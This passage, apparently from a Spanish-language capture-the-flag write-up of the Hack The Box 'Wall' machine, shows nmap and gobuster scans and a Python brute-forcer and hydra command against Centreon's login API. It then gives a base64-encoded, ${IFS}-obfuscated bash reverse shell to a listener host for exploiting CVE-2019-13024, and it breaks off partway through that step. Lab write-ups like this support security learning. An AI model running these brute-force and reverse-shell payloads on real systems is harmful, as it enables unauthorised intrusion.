&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Sep 25 03:51:50 2019 -- 1 IP address (1 host up) scanned in 18.00 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http---puerto-80&#34;&gt;HTTP - Puerto 80&lt;/h2&gt;
&lt;p&gt;La pagina web esta corriendo en un Apache/2.4.29.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/wall/Screenshot%20from%202019-09-25%2001.55.29.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;http---gobuster&#34;&gt;HTTP - GOBUSTER&lt;/h2&gt;
&lt;p&gt;Gobuster nos muestra las siguientes rutas de la pagina web.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/htb/wall# gobuster dir -u http://10.10.10.157/ -w /usr/share/wordlists/dirb/common.txt -n -x php,txt,html -t &lt;span class=&#34;nv&#34;&gt;15&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
Gobuster v3.0.1
by OJ Reeves &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; Christian Mehlmauer &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Url:            http://10.10.10.157/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Threads:        &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Wordlist:       /usr/share/wordlists/dirb/common.txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Status codes:   200,204,301,302,307,401,403
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User Agent:     gobuster/3.0.1
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Extensions:     php,txt,html
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No status:      &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Timeout:        &lt;span class=&#34;nv&#34;&gt;10s&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
2019/09/25 03:53:54 Starting &lt;span class=&#34;nv&#34;&gt;gobuster&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
/aa.php
/index.html
/index.html
/monitoring
/panel.php
/server-status
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
2019/09/25 03:56:21 &lt;span class=&#34;nv&#34;&gt;Finished&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;aaphp&#34;&gt;/aa.php&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/wall/Screenshot%20from%202019-09-26%2018.46.09.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;monitoring&#34;&gt;/monitoring&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/wall/Screenshot%20from%202019-09-26%2018.47.09.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;panelphp&#34;&gt;/panel.php&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/wall/Screenshot%20from%202019-09-26%2018.47.39.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizamos nuevamente una busqueda con un diccionario diferente y encontramos las siguientes rutas.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/htb/wall# gobuster dir -u http://10.10.10.157/ -w /usr/share/wordlists/subdscan.txt -n -x php,txt,html -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -z
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
Gobuster v3.0.1
by OJ Reeves &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; Christian Mehlmauer &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Url:            http://10.10.10.157/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Threads:        &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Wordlist:       /usr/share/wordlists/subdscan.txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Status codes:   200,204,301,302,307,401,403
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User Agent:     gobuster/3.0.1
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Extensions:     php,txt,html
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No status:      &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Timeout:        &lt;span class=&#34;nv&#34;&gt;10s&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
2019/09/27 01:12:38 Starting &lt;span class=&#34;nv&#34;&gt;gobuster&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
/aa.php
/centreon
/index.html
/monitoring
/panel.php
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
2019/09/27 01:17:42 &lt;span class=&#34;nv&#34;&gt;Finished&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;centreon---rce&#34;&gt;Centreon - RCE&lt;/h2&gt;
&lt;h4 id=&#34;centreon&#34;&gt;/centreon&lt;/h4&gt;
&lt;p&gt;Encontramos la plataforma de centreon de codigo abierto para el monitoreo de software o administracion de infraestructura en su version 19.04.0, al investigar un poco acerca de esta plataforma y su version vemos que existe una vulnerabilidad (CVE-2019-13024) en la plataforma que permite ejecutar codigo remoto (RCE). Para explotar esta vulnerabilidad necesitamos las credenciales de centreon.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/wall/Screenshot%20from%202019-09-26%2023.19.24.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;api---centreon&#34;&gt;API - Centreon&lt;/h3&gt;
&lt;p&gt;Utilizamos python para hacer un ataque de fuerza bruta contra la plataforma utilizando el diccionario rockyou.txt con la siguiente configuracion y utilizando la API de centreon.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://documentation.centreon.com/docs/centreon/en/19.04/api/api_rest/index.html#authentication&#34;&gt;&lt;strong&gt;Documentation Centreon - API&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/usr/bin/python
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;import requests
import json

&lt;span class=&#34;nv&#34;&gt;filepath&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/usr/share/wordlists/rockyou.txt&amp;#39;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://10.10.10.157/centreon/api/index.php?action=authenticate&amp;#39;&lt;/span&gt;

with open&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;filepath&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; as fp:
	&lt;span class=&#34;nv&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; fp.readline&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; line:		
		&lt;span class=&#34;nv&#34;&gt;password_r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;{&amp;#34;username&amp;#34;:&amp;#34;admin&amp;#34;, &amp;#34;password&amp;#34;:&amp;#34;_pass_&amp;#34;}&amp;#39;&lt;/span&gt;.replace&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_pass_&amp;#39;&lt;/span&gt;, line.strip&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;
		&lt;span class=&#34;nv&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; json.loads&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;password_r&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
		&lt;span class=&#34;nv&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; requests.post&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;url, &lt;span class=&#34;nv&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;data&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
		&lt;span class=&#34;nv&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; response.json&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
				
		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Bad credentials&amp;#34;&lt;/span&gt;:
			print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Password Incorrecta&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Bad parameters&amp;#34;&lt;/span&gt;:
			print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Error en request&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;:			
			print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;User:Pass &amp;#34;&lt;/span&gt; + str&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;+&lt;span class=&#34;s2&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt;+str&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;])))&lt;/span&gt;			
			&lt;span class=&#34;nb&#34;&gt;break&lt;/span&gt;
		&lt;span class=&#34;nv&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; fp.readline&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos la contraseña para el usuario &lt;code&gt;admin:password1&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/wall/Screenshot%20from%202019-09-27%2017.25.28.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;hydra&#34;&gt;Hydra&lt;/h4&gt;
&lt;p&gt;Una manera mas facil y sencilla de hacerlo es con hydra:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;hydra -l admin -P /usr/share/wordlists/rockyou.txt -s &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; 10.10.10.157 http-post-form &lt;span class=&#34;s2&#34;&gt;&amp;#34;/centreon/api/index.php?action=authenticate:username=^USER^&amp;amp;password=^PASS^:Bad credentials&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/wall/Screenshot%20from%202019-09-27%2017.26.36.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;rce---explotacion--shell&#34;&gt;RCE - Explotacion | Shell&lt;/h4&gt;
&lt;p&gt;Para explotar la vulnerabilidad de esta plataforma utilizamos el exploit &lt;a href=&#34;https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/&#34;&gt;&lt;strong&gt;Centreon RCE&lt;/strong&gt;&lt;/a&gt;, al utilizar el exploit y pasarle las credenciales y la url no ejecuta comandos dentro de la maquina, para poder ejecutar comandos utilizamos base64 y shell evasion ya que no permite ejecutar comandos en texto plano.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.tldp.org/LDP/abs/html/internalvariables.html&#34;&gt;&lt;strong&gt;Internal Variables&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Primero codificamos nuestra shell inversa en base64 omitiendo los saltos de linea, luego creamos nuestro comando para ejecucion en la plataforma en donde cada espacio es &lt;code&gt;${IFS}&lt;/code&gt;, y se agrega de ultimo punto y coma (&lt;code&gt;;&lt;/code&gt;)  ya que la vulnerabilidad permite ejecutar comandos con ciertos parametros (&lt;code&gt;-v /usr/local/centreon/filesGeneration/engine/1/centengine.DEBUG 2&amp;gt;&amp;amp;1&lt;/code&gt;) y agregamos esto ultimo para que no ejecute los parametros por default.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;s2&#34;&gt;&amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.145/7878 0&amp;gt;&amp;amp;1&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDUvNzg3OCAwPiYx
echo&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;IFS&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;-n&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;IFS&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDUvNzg3OCAwPiYx&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;IFS&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;IFS&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;base64&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;IFS&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;-d&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;IFS&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;IFS&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;bash&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;IFS&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Agregamos el siguiente codigo por encima de payload_info:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload_shell&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;repr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;echo${IFS}-n${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDUvNzg3OCAwPiYx${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash${IFS};&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Y dentro de &lt;code&gt;payload_info&lt;/code&gt; cambiamos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
